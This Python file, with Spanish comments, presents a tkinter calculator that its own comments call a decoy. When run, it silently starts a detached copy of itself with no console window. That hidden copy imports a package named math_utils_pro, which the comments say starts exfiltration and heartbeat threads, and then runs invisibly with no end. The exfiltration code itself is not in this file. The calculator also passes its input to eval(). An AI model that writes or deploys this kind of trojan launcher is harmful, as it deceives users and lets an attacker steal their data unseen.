import sys
import subprocess
import time
import os
import tkinter as tk
from tkinter import messagebox

# =====================================================================
# CONFIGURACIÓN DE PROCESOS
# =====================================================================

def is_background():
    return "--background" in sys.argv

def launch_background():
    """Lanza una instancia de este mismo script en segundo plano y desvinculada."""
    try:
        # Usamos CREATE_NO_WINDOW para que no aparezca ninguna consola en Windows
        subprocess.Popen(
            [sys.executable, __file__, "--background"],
            creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0,
            start_new_session=True
        )
    except Exception as e:
        pass

# =====================================================================
# LÓGICA DE LA CALCULADORA (DECOY)
# =====================================================================

class ModernCalculator:
    def __init__(self, root):
        self.root = root
        self.root.title("Calculadora Corporativa Pro")
        self.root.geometry("350x500")
        self.root.resizable(False, False)
        self.root.configure(bg="#1e1e1e")

        self.expression = ""
        self.input_text = tk.StringVar()

        # Pantalla
        input_frame = tk.Frame(self.root, width=350, height=100, bd=0, highlightbackground="#333", highlightcolor="#333", highlightthickness=1)
        input_frame.pack(side=tk.TOP)

        input_field = tk.Entry(input_frame, font=('Segoe UI', 32, 'bold'), textvariable=self.input_text, width=50, bg="#252526", fg="#ffffff", bd=0, justify=tk.RIGHT)
        input_field.grid(row=0, column=0)
        input_field.pack(ipady=20)

        # Botones
        btns_frame = tk.Frame(self.root, bg="#1e1e1e")
        btns_frame.pack()

        buttons = [
            'C', '/', '*', '-',
            '7', '8', '9', '+',
            '4', '5', '6', '=',
            '1', '2', '3', '0',
            '.', 'Exit'
        ]

        row = 0
        col = 0
        for button in buttons:
            action = lambda x=button: self.on_click(x)
            
            # Estilo especial para operadores
            bg_color = "#333333"
            fg_color = "#ffffff"
            if button in ['/', '*', '-', '+', '=']:
                bg_color = "#0078d7"
            elif button == 'C':
                bg_color = "#d11a2a"
            elif button == 'Exit':
                bg_color = "#444444"

            btn = tk.Button(btns_frame, text=button, width=8, height=3, fg=fg_color, bg=bg_color, font=('Segoe UI', 12, 'bold'), bd=0, cursor="hand2", activebackground="#555", command=action)
            
            if button == '=':
                btn.grid(row=row, column=col, rowspan=2, sticky="nsew", padx=2, pady=2)
                # No incrementamos row/col aquí para que el siguiente se ajuste
            elif button == '0':
                btn.grid(row=row, column=col, columnspan=1, sticky="nsew", padx=2, pady=2)
            else:
                btn.grid(row=row, column=col, padx=2, pady=2)

            col += 1
            if col > 3:
                col = 0
                row += 1

    def on_click(self, char):
        if char == "C":
            self.expression = ""
        elif char == "Exit":
            self.root.destroy()
            return
        elif char == "=":
            try:
                self.expression = str(eval(self.expression))
            except Exception:
                self.expression = "Error"
        else:
            self.expression += str(char)
        
        self.input_text.set(self.expression)

def run_gui():
    root = tk.Tk()
    # Intentar que no aparezca la consola de Python detrás si es posible
    # (En Windows se suele usar .pyw o pythonw.exe, pero aquí forzamos la app)
    app = ModernCalculator(root)
    root.mainloop()

# =====================================================================
# PUNTO DE ENTRADA
# =====================================================================

if __name__ == "__main__":
    if is_background():
        # --- PROCESO DE ATAQUE (SEGUNDO PLANO) ---
        # Al importar math_utils_pro, se disparan los hilos de exfiltración y heartbeat
        # definidos en su __init__.py
        try:
            import math_utils_pro
            # Mantenemos el proceso vivo indefinidamente (invisible)
            while True:
                time.sleep(60)
        except Exception:
            sys.exit(1)
    else:
        # --- PROCESO PRINCIPAL (GUI) ---
        # 1. Lanzamos el proceso de fondo "hijo" desvinculado
        launch_background()
        
        # 2. Iniciamos la interfaz de usuario "bonita"
        run_gui()
